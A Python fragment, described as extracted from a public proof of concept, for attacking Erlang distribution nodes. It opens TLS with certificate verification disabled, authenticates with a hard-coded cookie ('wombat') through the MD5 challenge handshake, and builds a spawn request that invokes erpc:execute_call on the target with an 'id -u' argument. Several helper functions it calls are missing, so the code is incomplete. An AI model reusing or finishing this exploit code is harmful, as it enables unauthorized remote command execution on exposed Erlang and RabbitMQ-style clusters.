# Extracted protocol operations from the recovered public PoC.
import socket, ssl, hashlib, struct, random
DIST_FLAGS = 0x0D07DF7FBD
CREATION = 4

def atom(s):
    """SMALL_ATOM_UTF8_EXT (119)."""
    b = s.encode()
    return bytes([119, len(b)]) + b

def _send_raw(sock, data):
    sock.sendall(struct.pack(">I", len(data)) + data)

def tls_connect(host, port, timeout=15):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    raw = socket.create_connection((host, port), timeout=timeout)
    return ctx.wrap_socket(raw, server_hostname=host)

def dist_handshake(sock, node_name, cookie):
    """Returns (ok, detail). detail = server node name on success."""
    name = node_name.encode()
    hello = (b"N" + struct.pack(">Q", DIST_FLAGS)
             + struct.pack(">I", CREATION)
             + struct.pack(">H", len(name)) + name)
    _send_raw(sock, hello)

    status = _recv_raw(sock)
    if status is None:
        return False, "connection closed after name"
    if status[:1] != b"s":
        return False, "unexpected response"
    stxt = status[1:].decode(errors="replace").strip("\x00")
    if stxt != "ok":
        return False, stxt

    chal = _recv_raw(sock)
    if chal is None or chal[:1] != b"N":
        return False, "no challenge"
    server_challenge = struct.unpack(">I", chal[9:13])[0]
    server_nlen = struct.unpack(">H", chal[17:19])[0]
    server_node = chal[19:19 + server_nlen].decode(errors="replace")

    my_challenge = random.getrandbits(32)
    digest = hashlib.md5(
        cookie.encode() + str(server_challenge).encode()).digest()
    _send_raw(sock, b"r" + struct.pack(">I", my_challenge) + digest)

    ack = _recv_raw(sock)
    if ack is None or ack[:1] != b"a":
        return False, "closed after challenge reply (wrong cookie)"
    expected = hashlib.md5(
        cookie.encode() + str(my_challenge).encode()).digest()
    if ack[1:17] != expected:
        return False, "challenge ack mismatch (wrong cookie)"
    return True, server_node

def send_dist(sock, *terms):
    _send_raw(sock, b"\x83\x44\x00" + b"".join(terms))

NODE = "wombat@127.0.0.1"
COOKIE = "wombat"
def build_request(sock, req_id, req_ref, mypid, gl):
    mfa = tup(atom("erpc"), atom("execute_call"), small_int(4))
    opts = lst([atom("monitor")])
    args = lst([req_id, atom("os"), atom("getenv"), lst([string_ext("id -u")])])
    send_dist(sock, tup(small_int(29), req_ref, mypid, gl, mfa, opts), args)
